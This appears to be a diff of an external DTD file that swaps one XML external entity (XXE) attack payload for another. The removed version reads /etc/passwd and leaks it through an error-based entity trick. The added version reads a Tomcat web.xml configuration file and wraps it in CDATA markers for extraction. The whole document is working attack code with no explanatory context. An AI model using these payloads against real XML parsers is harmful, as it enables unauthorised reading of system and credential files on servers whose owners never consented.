@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
-%eval;
-%exfil;
+<!ENTITY % start "<![CDATA[">                                                                                 
+<!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/web.xml">                                               
+<!ENTITY % end "]]>">                                                                                         
+<!ENTITY fileContents "%start;%file;%end;">     
